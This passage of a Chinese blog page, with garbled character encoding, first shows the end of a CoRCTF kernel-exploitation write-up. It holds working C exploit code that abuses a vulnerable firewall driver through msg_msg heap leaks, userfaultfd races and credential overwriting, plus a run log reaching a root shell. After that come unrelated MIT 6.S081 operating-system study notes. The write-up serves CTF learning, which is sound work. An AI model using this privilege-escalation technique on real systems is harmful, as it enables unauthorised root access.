class="number">-0x30</span>,IPC_NOWAIT);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_page_msg</span><span class="params">()</span></span>&#123;</span><br><span class="line">    *(<span class="keyword">size_t</span> *)(page2+<span class="number">0x1000</span><span class="number">-0x8</span>)=<span class="number">0x1</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;get_page_msg\n&quot;</span>);</span><br><span class="line">    send_msg(msg_id[<span class="number">2</span>],page2+<span class="number">0x1000</span><span class="number">-0x8</span>,<span class="number">0x1000</span><span class="number">-0x30</span>+<span class="number">0x10</span>,IPC_NOWAIT);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> re_buf[<span class="number">0x2000</span>/<span class="number">8</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    fd=open(<span class="string">&quot;/dev/firewall&quot;</span>,O_RDWR);</span><br><span class="line">    <span class="keyword">if</span>(fd&lt;<span class="number">0</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;open firewall fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    msg_id[<span class="number">0</span>]=make_queue(IPC_PRIVATE,<span class="number">0666</span>|IPC_CREAT);</span><br><span class="line">    msg_id[<span class="number">1</span>]=make_queue(IPC_PRIVATE,<span class="number">0666</span>|IPC_CREAT);</span><br><span class="line">    msg_id[<span class="number">2</span>]=make_queue(IPC_PRIVATE,<span class="number">0666</span>|IPC_CREAT);</span><br><span class="line">    user_msg *msg=(user_msg *)<span class="built_in">malloc</span>(<span class="number">0x2000</span>);</span><br><span class="line">    page1=(<span class="keyword">char</span> *)mmap(<span class="number">0x200000</span>,<span class="number">0x3000</span>,PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    page2=(<span class="keyword">char</span> *)mmap(<span class="number">0x300000</span>,<span class="number">0x3000</span>,PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>((!page1)||(!page2))&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;mmap fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    register_userfault(page1+<span class="number">0x1000</span>,<span class="number">0x1000</span>,handler_write_msg,&amp;td[<span class="number">0</span>]);</span><br><span class="line">    register_userfault(page2+<span class="number">0x1000</span>,<span class="number">0x1000</span>,handler_write_task,&amp;td[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">10</span>;i&lt;<span class="number">16</span>;i++)&#123;</span><br><span class="line">        add_rule(fd,i,INBOUND);</span><br><span class="line">    &#125;</span><br><span class="line">    add_rule(fd,<span class="number">0</span>,INBOUND);</span><br><span class="line">    dup_rule(fd,<span class="number">0</span>,INBOUND);</span><br><span class="line">    del_rule(fd,<span class="number">0</span>,INBOUND);</span><br><span class="line">    msg-&gt;mtype=<span class="number">1</span>;</span><br><span class="line">    <span class="built_in">memset</span>(msg-&gt;mtext,<span class="number">0x61</span>,<span class="number">0x1000</span>);</span><br><span class="line">    send_msg(msg_id[<span class="number">0</span>],msg,<span class="number">0x10</span>,IPC_NOWAIT);</span><br><span class="line">    <span class="built_in">memset</span>(msg-&gt;mtext,<span class="number">0x62</span>,<span class="number">0x1000</span>);</span><br><span class="line">    send_msg(msg_id[<span class="number">1</span>],msg,<span class="number">0x10</span>,IPC_NOWAIT);</span><br><span class="line">    <span class="built_in">memset</span>(msg-&gt;mtext,<span class="number">0x63</span>,<span class="number">0x1000</span>);</span><br><span class="line">    send_msg(msg_id[<span class="number">1</span>],msg,<span class="number">0x1fc8</span>,IPC_NOWAIT);</span><br><span class="line"></span><br><span class="line">    msg_header fake_msg_header;</span><br><span class="line">    fake_msg_header.ll_next=(<span class="keyword">void</span> *)<span class="number">0x4141414141414141</span>;</span><br><span class="line">    fake_msg_header.ll_prev=(<span class="keyword">void</span> *)<span class="number">0x4242424242424242</span>;</span><br><span class="line">    fake_msg_header.m_type=<span class="number">1</span>;</span><br><span class="line">    fake_msg_header.m_ts=<span class="number">0x2000</span>;</span><br><span class="line">    edit_rule(fd,&amp;fake_msg_header,<span class="number">0</span>,OUTBOUND,<span class="number">0</span>);</span><br><span class="line">    get_msg(msg_id[<span class="number">0</span>],re_buf,<span class="number">0x2000</span>,<span class="number">0</span>, IPC_NOWAIT | MSG_COPY | MSG_NOERROR);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">0x2000</span>/<span class="number">0x8</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(re_buf[i])&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[*] %p\n&quot;</span>,re_buf[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>((!<span class="built_in">strncmp</span>(&amp;re_buf[i],<span class="string">&quot;bbbbbbbbbbbbbbbb&quot;</span>,<span class="number">0x10</span>))&amp;&amp;(!<span class="built_in">queue</span>))&#123;</span><br><span class="line">            <span class="built_in">queue</span>=re_buf[i<span class="number">-5</span>];</span><br><span class="line">            page_msg=re_buf[i<span class="number">-6</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(((re_buf[i]&amp;<span class="number">0xffff</span>)==<span class="number">0x1520</span>)&amp;&amp;(!kernelbase))&#123; <span class="comment">//error_injection_list</span></span><br><span class="line">            kernelbase=re_buf[i]<span class="number">-0xc41520</span>;</span><br><span class="line">            init_task=kernelbase+<span class="number">0xc124c0</span>;</span><br><span class="line">            init_cred=kernelbase+<span class="number">0xc33060</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">queue</span>&amp;&amp;kernelbase)&#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\e[40;32m msg_queue_addr:%p \e[0m\n&quot;</span>,<span class="built_in">queue</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\e[40;32m page_msg_addr:%p \e[0m\n&quot;</span>,page_msg);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\e[40;32m kernelbase_addr:%p \e[0m\n&quot;</span>,kernelbase);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\e[40;32m init_task_addr:%p \e[0m\n&quot;</span>,init_task);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\e[40;32m init_cred_addr:%p \e[0m\n&quot;</span>,init_cred);</span><br><span class="line">    <span class="keyword">if</span>((!<span class="built_in">queue</span>)||(!kernelbase))&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;get queue fail or kernelbase fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    find_current_task();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\e[40;32m current_task_addr:%p \e[0m\n&quot;</span>,current_task);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//1.å…ˆé‡‹æ”¾4Kçš„msg</span></span><br><span class="line">    get_msg(msg_id[<span class="number">1</span>],re_buf,<span class="number">0x10</span>,<span class="number">0</span>,IPC_NOWAIT | MSG_NOERROR);</span><br><span class="line">    get_msg(msg_id[<span class="number">1</span>],re_buf,<span class="number">0x1fc8</span>,<span class="number">0</span>,IPC_NOWAIT | MSG_NOERROR);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//2.ç„¶å¾Œå†æŠŠä»–å€‘ç”³è«‹å›ä¾†,ä¸¦ä¸”é€šéuserfaultå¡ä½</span></span><br><span class="line">    </span><br><span class="line">    pthread_create(&amp;td[<span class="number">2</span>],<span class="literal">NULL</span>,get_page_msg_next,<span class="literal">NULL</span>);</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">    <span class="comment">//3.ç„¶å¾Œå†æŠŠmsgçš„æ®µé€šéæˆ‘å€‘æ§åˆ¶çš„msgçµ¦é‡‹æ”¾æ‰</span></span><br><span class="line">    fake_msg_header.ll_next=<span class="built_in">queue</span>;</span><br><span class="line">    fake_msg_header.ll_prev=<span class="built_in">queue</span>;</span><br><span class="line">    fake_msg_header.m_type=<span class="number">1</span>;</span><br><span class="line">    fake_msg_header.m_ts=<span class="number">0x10</span>;</span><br><span class="line">    fake_msg_header.next=page_msg;</span><br><span class="line">    edit_rule(fd,&amp;fake_msg_header,<span class="number">0</span>,OUTBOUND,<span class="number">1</span>);</span><br><span class="line">    get_msg(msg_id[<span class="number">0</span>],re_buf,<span class="number">0x10</span>,<span class="number">0</span>,IPC_NOWAIT | MSG_NOERROR);</span><br><span class="line">    <span class="comment">//4.ç„¶å¾Œå†æŠŠé‡‹æ”¾æ‰çš„msgçš„æ®µç”³è«‹å›ä¾†ï¼Œé€™æ¬¡ä»–æ˜¯msgäº†,ä¸¦ä¸”å†æ¬¡é€šéuserfaultå¡ä½</span></span><br><span class="line">    pthread_create(&amp;td[<span class="number">3</span>],<span class="literal">NULL</span>,get_page_msg,<span class="literal">NULL</span>);</span><br><span class="line">    pthread_join(td[<span class="number">0</span>],<span class="literal">NULL</span>);</span><br><span class="line">    pthread_join(td[<span class="number">1</span>],<span class="literal">NULL</span>);</span><br><span class="line">    pthread_join(td[<span class="number">2</span>],<span class="literal">NULL</span>);</span><br><span class="line">    pthread_join(td[<span class="number">3</span>],<span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;uid:%d\n&quot;</span>,getuid());</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æœ‰æ¦‚ç‡æˆåŠŸï¼Œä¸»è¦æ˜¯è¶Šç•Œè¯»çš„slabçš„å†…å®¹ä¸å¯æ§ï¼Œå¯èƒ½èƒ½è¯»åˆ°å¯èƒ½è¯»ä¸åˆ°ï¼Œåº”è¯¥å’Œslabçš„freelistçš„éšæœºåŒ–æœ‰å…³ã€‚</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">ctf@CoRCTF:/$ /myexp</span><br><span class="line"> msg_queue_addr:0xffffa041855bf6c0 </span><br><span class="line"> page_msg_addr:0xffffa041855c1000 </span><br><span class="line"> kernelbase_addr:0xffffffff9ea00000 </span><br><span class="line"> init_task_addr:0xffffffff9f6124c0 </span><br><span class="line"> init_cred_addr:0xffffffff9f633060 </span><br><span class="line"> pid:0  getpid:86 </span><br><span class="line"> pid:86  getpid:86 </span><br><span class="line"> current_task_addr:0xffffa04186128ac0 </span><br><span class="line">[+] handler_write_task created</span><br><span class="line">[+] handler_write_msg created</span><br><span class="line">[*] page fault 1 at page1+0x1000</span><br><span class="line">get_page_msg</span><br><span class="line">[+] page fault 2 at page2+0x1000</span><br><span class="line">write msg ok</span><br><span class="line">[*] msg next write is ok</span><br><span class="line">write task ok</span><br><span class="line"> debug</span><br><span class="line">uid:0</span><br><span class="line">root@CoRCTF:/<span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root)</span><br></pre></td></tr></table></figure>

<h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>åˆ©ç”¨msgè¿›è¡Œè¶Šç•Œè¯»å’Œä»»æ„è¯»è¿˜æ˜¯å¾ˆå¥½ç”¨çš„ï¼Œä½†æ³¨æ„å¾—å¼€å¯<code>MSG_COPY</code>,ä½†æ˜¯é€šè¿‡msgè¿›è¡Œä»»æ„å†™è¿˜å¾—é…åˆ<code>userfault</code>,ä½†åœ¨é«˜ç‰ˆæœ¬ä¸­åªæœ‰rootç”¨æˆ·æ‰èƒ½ä½¿ç”¨<code>userfault</code>ï¼Œæ‰€ä»¥æ„Ÿè§‰åˆ©ç”¨msgè¿›è¡Œä»»æ„è¯»åœ¨çœŸå®åœºæ™¯ä¸­ä¸å¥½å®ç°çš„ã€‚</p>
<h2 id="æ€è€ƒ"><a href="#æ€è€ƒ" class="headerlink" title="æ€è€ƒ"></a>æ€è€ƒ</h2><p>åœ¨æœ¬é¢˜çš„åˆ©ç”¨ä¸­ï¼Œé™¤äº†uafä»¥å¤–è¿˜æä¾›äº†å†™æ¥å£ï¼Œæˆ‘åœ¨æƒ³æ˜¯å¦ç»§ç»­å‹ç¼©æ¡ä»¶ï¼Œä¸ä½¿ç”¨è¿™ä¸ªå†™æ¥å£ï¼Œè€Œæ˜¯é€šè¿‡æŠŠè¿™ä¸ªuafè½¬åŒ–æˆä¸€ä¸ªdoublefreeç„¶åä½¿ç”¨ä¸€ä¸ªé€šè§£å®Œæˆåˆ©ç”¨ï¼Œæˆ‘åœ¨å…¶ä»–åšå®¢ä¸­è§åˆ°è¿‡ç±»ä¼¼æ€è·¯ï¼Œæ„Ÿè§‰æ˜¯å¯è¡Œçš„ï¼Œè¯•è¯•çœ‹ã€‚</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/10/17/mit6-081%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E8%AF%BE%E7%A8%8B%E5%8F%8A%E5%AE%9E%E9%AA%8C/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="rootzhang">
      <meta itemprop="description" content="æˆ‘çš„åšå®¢">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="study">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/10/17/mit6-081%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E8%AF%BE%E7%A8%8B%E5%8F%8A%E5%AE%9E%E9%AA%8C/" class="post-title-link" itemprop="url">mit6.081æ“ä½œç³»ç»Ÿè¯¾ç¨‹åŠå®éªŒ</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">å‘è¡¨äº</span>

              <time title="åˆ›å»ºæ—¶é—´ï¼š2022-10-17 23:45:13" itemprop="dateCreated datePublished" datetime="2022-10-17T23:45:13+08:00">2022-10-17</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">æ›´æ–°äº</span>
                <time title="ä¿®æ”¹æ—¶é—´ï¼š2022-10-25 01:14:03" itemprop="dateModified" datetime="2022-10-25T01:14:03+08:00">2022-10-25</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="mit6-s081"><a href="#mit6-s081" class="headerlink" title="mit6.s081"></a>mit6.s081</h1><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>åœ¨å­¦ä¹ äº†ä¸€æ®µæ—¶é—´çš„kernelpwnåï¼Œå‘ç°è‡ªå·±å¯¹äºæ“ä½œç³»ç»Ÿç†è§£çš„è¿˜æ˜¯ååˆ†æµ…è–„ï¼Œé‚æƒ³æµ…æµ…æ·±å…¥å­¦ä¹ ä¸€ä¸‹ï¼Œç„¶åä»a3å¤§ä½¬å¾—çŸ¥mitçš„æ“ä½œç³»ç»Ÿè¯¾ç¨‹ååˆ†ä¹‹å¥½ä¾¿ä¸‹å®šå†³å¿ƒè·Ÿç€è¿‡ä¸€éï¼Œæœ¬æ¥æ˜¯æƒ³å­¦ä¹ mit6.828çš„ï¼Œä½†ä¸ç®¡æ•™æè¿˜æ˜¯è§†é¢‘å…¨æ˜¯æ´‹æ–‡ï¼Œè€Œæˆ‘çš„æ´‹æ–‡èƒ½åŠ›ç€å®æœ‰é™ï¼Œå¹¸å¥½æˆ‘æ‰¾è§äº†mit6.s081ç‰ˆï¼Œä¹Ÿåœ¨ç½‘ä¸Šæ‰¾è§äº†ç¿»è¯‘ç‰ˆï¼Œè¿˜æœ‰è¯¸å¤šåšå®¢å¯ä»¥ç­”ç–‘ï¼Œæ„Ÿè§‰å¯è¡Œï¼Œé‚£å°±å¼€å¹²ï¼</p>
<h2 id="å‡†å¤‡"><a href="#å‡†å¤‡" class="headerlink" title="å‡†å¤‡"></a>å‡†å¤‡</h2><h3 id="git"><a href="#git" class="headerlink" title="git"></a>git</h3><p>è¯¾ç¨‹ä½¿ç”¨çš„æ˜¯gitè¿›è¡Œä»£ç ç®¡ç†å’Œç‰ˆæœ¬æ§åˆ¶çš„ï¼Œå¯ç¬‘æˆ‘åˆ°ç›®å‰ä¸ºæ­¢åªç†Ÿæ‚‰<code>git close</code>,æ‰€ä»¥å†å¼€å§‹ä¹‹å‰å¾—äº†è§£ä¸€ä¸‹gitçš„å‘½ä»¤ã€‚</p>
<p>çœ‹äº†å‡ ä¸ªå°æ—¶ï¼Œå¤§æ¦‚èƒ½ä½¿ç”¨äº†ã€‚</p>
<h3 id="RSIC-VæŒ‡ä»¤é›†"><a href="#RSIC-VæŒ‡ä»¤é›†" class="headerlink" title="RSIC-VæŒ‡ä»¤é›†"></a>RSIC-VæŒ‡ä»¤é›†</h3><p>â€¦â€¦æ­¤å¤„çœç•¥å¥½å¤šå­—</p>
<h3 id="ç¯å¢ƒå‡†å¤‡"><a href="#ç¯å¢ƒå‡†å¤‡" class="headerlink" title="ç¯å¢ƒå‡†å¤‡"></a>ç¯å¢ƒå‡†å¤‡</h3><p>æˆ‘ä½¿ç”¨çš„æ˜¯æœ€æ–°çš„ubuntu22,å…¶å®å®Œå…¨ä¸ç”¨æœä»€ä¹ˆæ­å»ºç¯å¢ƒæ•™ç¨‹çš„ï¼Œè¯¾ç¨‹çš„ç½‘é¡µå·²ç»éå¸¸æ¸…æ¥šäº†ï¼ˆä»–æ¨èçš„æ˜¯ubuntu20.4ï¼‰ï¼ŒæŒ‰ç…§å®ƒæ‰€è¿°ä¸€æ­¥ä¸€æ­¥æ¥å°±å¥½äº†ï¼Œå¯æƒœæˆ‘æ„è¯†åˆ°è¿™ä¸€ç‚¹çš„æ—¶å€™å·²ç»æµªè´¹äº†ä¸€ä¸¤ä¸ªå°æ—¶äº†</p>
<p>å‡†å¤‡å®Œç¯å¢ƒæœ€æ¿€åŠ¨äººå¿ƒçš„å°±æ˜¯å®éªŒè°ƒè¯•ç¯å¢ƒè§£äº†ï¼Œè°ƒè¯•æˆ‘å‚è€ƒçš„æ˜¯è¿™ç¯‡æ–‡ç« <a target="_blank" rel="noopener" href="https://xistor.github.io/post/6.s081/xv6-gdb/">qemu xv6 ä½¿ç”¨GDBè°ƒè¯• - xistorâ€™s notes</a></p>
<p><img src="C:\Users\å¼ é¹\AppData\Roaming\Typora\typora-user-images\image-20220806173357404.png" alt="image-20220806173357404"></p>
<p>æˆ‘åœ¨lsä¸Šä¸‹äº†æ–­ç‚¹ï¼Œå¯è§æˆåŠŸæˆªä½äº†ã€‚</p>
<p>ä»è¿™ç¯‡æ–‡ç« ä¸­äº†è§£åˆ°äº†å…³äº<del>/.gdbinitæ–‡ä»¶çš„ä½¿ç”¨ï¼Œå¯ä»¥å‘è¿™ä¸ªæ–‡ä»¶ä¸­å†™å…¥gdbå‘½ä»¤ï¼Œå½“gdbæ‰§è¡Œçš„æ—¶å€™ä¼šåœ¨å½“å‰ç”¨æˆ·çš„ä¸»ç›®å½•ä¸‹å¯»æ‰¾<code>.gdbinit</code>æ–‡ä»¶ç„¶åæ‰§è¡Œå…¶ä¸­çš„å‘½ä»¤ï¼Œå½“ä½ æƒ³è¦gdbæ‰§è¡Œä¸åœ¨å½“å‰ç”¨æˆ·çš„ä¸»ç›®å½•ä¸‹çš„<code>.gdbinit</code>çš„æ—¶å€™ï¼Œå¯ä»¥åœ¨`</del>/.gdbinit<code>æ–‡ä»¶ä¸­å¯¼å…¥ï¼Œä¾‹å¦‚</code>add-auto-load-safe-path /home/x/xv6-labs-2021/.gdbinit<code>,è¿™æ ·åšçš„è¯è°ƒè¯•çš„æ—¶å€™å°±éå¸¸æ–¹ä¾¿äº†ï¼Œåªéœ€è¦é”®å…¥</code>gdb-multiarch`å°±å¯ä»¥ç›´æ¥è®¾ç½®æ¶æ„å¹¶è¿æ¥qemuäº†ã€‚</p>
<h2 id="Lecture"><a href="#Lecture" class="headerlink" title="Lecture"></a>Lecture</h2><h4 id="Lecture1"><a href="#Lecture1" class="headerlink" title="Lecture1"></a>Lecture1</h4><p>è®²äº†ä¸€ç‚¹æ“ä½œç³»ç»Ÿå¤§ä½“ä½œç”¨ä»¥åŠç»“æ„ï¼Œç„¶åé€šè¿‡å‡ ä¸ªä¾‹å­ç¤ºèŒƒäº†ç³»ç»Ÿè°ƒç”¨ï¼Œå…¶ä¸­æ¯”è¾ƒæœ‰æ”¶è·çš„æ˜¯fork+execä¸¤ä¸ªç³»ç»Ÿè°ƒç”¨çš„æ­é…å¯ä»¥åœ¨å­è¿›ç¨‹é‡æ–°è½½å…¥ä¸€ä¸ªæ–°ç¨‹åºï¼Œæ‰€ä»¥åŸæ¥çš„å­è¿›ç¨‹è¢«å®Œå…¨å–ä»£ï¼Œä¸€èˆ¬æƒ…å†µä¸‹execå‡½æ•°ä¸ä¼šè¿”å›ã€‚å€¼å¾—æ³¨æ„çš„æ˜¯exec()åçš„ç¨‹åºçš„æ–‡ä»¶æè¿°ç¬¦å¹¶æ²¡æœ‰é‡ç½®ï¼Œè¿˜æ˜¯å’Œæºç¨‹åºä¸€æ ·ï¼Œåˆ©ç”¨è¿™ä¸ªç‰¹æ€§å¯ä»¥å®Œæˆä¸€äº›éªšæ“ä½œã€‚</p>
<p>æ€»ä½“æ¯”è¾ƒç®€å•ã€‚è¿™èŠ‚è¯¾æœ‰è¯¾åå®éªŒï¼Œæˆ‘çœ‹è¯¾ç¨‹ä»‹ç»å¥½åƒå¯ä»¥åœ¨æœ¬åœ°æµ‹è¯•è‡ªå·±çš„å®éªŒå¹¶æ‰“å‡ºåˆ†æ•°ï¼Œå†è¥¿ï¼Œæ˜å¤©çœ‹çœ‹æ€ä¹ˆæ•´ã€‚</p>
<h4 id="Lecture3"><a href="#Lecture3" class="headerlink" title="Lecture3"></a>Lecture3</h4><p><strong>éš”ç¦»æ€§</strong>ï¼šæ“ä½œç³»ç»Ÿæä¾›è¿›ç¨‹å’Œè¿›ç¨‹ä¹‹é—´çš„å¢™éš”ç¦»ä»¥åŠè¿›ç¨‹å’Œç¡¬ä»¶èµ„æºçš„å¼ºéš”ç¦»ï¼Œéš”ç¦»çš„æ‰‹æ®µæ˜¯è¿›è¡ŒæŠ½è±¡ï¼Œæä¾›ç³»ç»Ÿè°ƒç”¨æ¥å£ã€‚</p>
<p><strong>é˜²å¾¡æ€§</strong>ï¼šé¦–å…ˆå¾—å…·æœ‰é”™è¯¯å¤„ç†èƒ½åŠ›ï¼Œå¦‚æœç”¨æˆ·æ€è¿›ç¨‹ä½¿ç”¨ç³»ç»Ÿè°ƒç”¨çš„æ—¶å€™ä¼ å…¥äº†é”™è¯¯çš„å‚æ•°ï¼Œå†…æ ¸å¾—å…·æœ‰å¤„ç†è¿™ç§é”™è¯¯çš„èƒ½åŠ›ï¼Œå…¶æ¬¡æ˜¯åº”ç”¨ç¨‹åºä¸èƒ½ç ´åéš”ç¦»æ€§ï¼Œè¿™é‡Œçš„éš”ç¦»æŒ‡è¿›ç¨‹å’Œå†…æ ¸çš„éš”ç¦»ï¼Œæƒ³è¦å®ç°è¿™ç§éš”ç¦»æ€§å¾—éœ€è¦ç¡¬ä»¶æ”¯æŒï¼Œæ¯”å¦‚å†…æ ¸æ¨¡å¼å’Œç”¨æˆ·æ¨¡å¼ä»¥åŠè™šæ‹Ÿå†…å­˜ã€‚</p>
<p><strong>user/kernel</strong>:å½“cpuè¿è¡Œåœ¨kernelæ¨¡å¼ä¸­å°±ä¼šæ‹¥æœ‰æ‰§è¡Œç‰¹æƒæŒ‡ä»¤çš„æƒé™ï¼Œç‰¹æƒæŒ‡ä»¤æŒ‡ç›´æ¥æ“ä½œç¡¬ä»¶çš„æŒ‡ä»¤ï¼Œç›¸å¯¹çš„è¿è¡Œåœ¨useræ¨¡å¼åªèƒ½æ‰§è¡Œéç‰¹æƒæŒ‡ä»¤ï¼Œå½“useræ¨¡å¼ä¸‹æ‰§è¡Œç‰¹æƒæŒ‡ä»¤æ—¶cpuå¹¶ä¸ä¼šçœŸæ­£å»æ‰§è¡Œï¼Œè€Œæ˜¯ä»userè·³åˆ°kernelï¼Œå†…æ ¸è·å¾—cpuæ§åˆ¶æƒï¼Œç„¶åè®©å†…æ ¸åˆ¤æ–­useræ˜¯å¦å‡ºç°äº†é—®é¢˜æ˜¯å¦æ”¹æ€æ­»ã€‚</p>
<p><strong>user-&gt;kernel</strong>:æœ‰ä¸“é—¨çš„çš„ä¸€ä¸ªæŒ‡ä»¤å¯ä»¥ä»useråˆ°kernel,åœ¨x86ä¸‹æ˜¯syscall,åœ¨æœ¬æ¬¡è¯¾ç¨‹ä¸­çš„risc-vä¸­æ˜¯<code>ecall</code>ï¼Œç³»ç»Ÿè°ƒç”¨å·å­˜å‚¨åœ¨<code>a0</code>å¯„å­˜å™¨ä¸­ã€‚</p>
<p><strong>å®å†…æ ¸&amp;å¾®å†…æ ¸</strong>ï¼šç›¸æ¯”èµ·å®å†…æ ¸ï¼Œå¾®å†…æ ¸çš„è¯¸å¤šæœåŠ¡éƒ½è¿è¡Œåœ¨useræ¨¡å¼ï¼Œåœ¨æ™®é€šè¿›ç¨‹æƒ³è¦ä½¿ç”¨è¿™äº›æœåŠ¡çš„æ—¶å€™é€šçŸ¥å†…æ ¸ï¼Œå†…æ ¸å†é€šçŸ¥æœåŠ¡ï¼Œè¿™æ ·ä¼šå¯¼è‡´Userå’Œkernelçš„åˆ‡æ¢æ¯”è¾ƒé¢‘ç¹ã€‚</p>
<h4 id="Lecture4"><a href="#Lecture4" class="headerlink" title="Lecture4"></a><strong>Lecture4</strong></h4><blockquote>
<p>å¯¹è™šæ‹Ÿå†…å­˜çš„çœ‹æ³•</p>
<p>åœ¨æˆ‘çœ‹æ¥è™šæ‹Ÿå†…å­˜ä¸»è¦æœ‰ä¸¤ç‚¹ï¼Œä¸€ç‚¹æ˜¯å®Œç¾çš„è¿›ç¨‹éš”ç¦»ï¼Œæ¯ä¸ªè¿›ç¨‹éƒ½æœ‰è‡ªå·±çš„é¡µè¡¨ï¼Œä¸ä¼šè®¿é—®åˆ°å…¶ä»–è¿›ç¨‹çš„é¡µè¡¨ï¼ŒäºŒæ˜¯ä¸ç›´æ¥æ“ä½œç‰©ç†å†…å­˜ï¼Œä¹Ÿå°±æ˜¯ç¡¬ä»¶ï¼Œä¼šæ¯”è¾ƒå¥½çš„ä¿æŠ¤ç¡¬ä»¶</p>
</blockquote>
<p>risc-vè™šæ‹Ÿå†…å­˜ç®€å•ç†è§£ï¼šå’Œx86å¾ˆç±»ä¼¼ï¼Œä¹Ÿæœ‰ä¸€ä¸ªmmuè·¯ç”±å¯¹cpuæƒ³è¦è®¿é—®çš„è™šæ‹Ÿåœ°å€è¿›è¡Œç¿»è¯‘ï¼Œç¿»è¯‘æˆç‰©ç†å†…å­˜ï¼Œ<code>stap</code>å¯„å­˜å™¨å°±å­˜æ”¾ç€è¿›ç¨‹çš„é¡µè¡¨çš„ç‰©ç†åœ°å€ï¼Œä¹Ÿè¡¨ä¸­å°±å­˜æ”¾ç€è™šæ‹Ÿå†…å­˜åˆ°ç‰©ç†å†…å­˜çš„æ˜ å°„ï¼Œmmuå°±é€šè¿‡è®¿é—®stapæ¥è¿›è¡Œç¿»è¯‘</p>
<p><strong>é¡µè¡¨è®¾è®¡</strong></p>
<p>åœ¨xv6æ“ä½œç³»ç»Ÿä¸­è™šæ‹Ÿåœ°å€çš„å‰25ä½å¹¶æ²¡æœ‰è¢«ä½¿ç”¨ï¼Œæ‰€ä»¥å°½ç®¡å¯„å­˜å™¨æ˜¯64ä½ï¼Œç‰©ç†åœ°å€æ˜¯56ä½ï¼Œä½†å…¶å¯»å€ç©ºé—´è¿˜æ˜¯2^39ï¼Œåœ¨è¿™39ä½ä¸­å‰27ä½æ˜¯ç´¢å¼•ï¼Œå12ä½æ˜¯åç§»ã€‚</p>
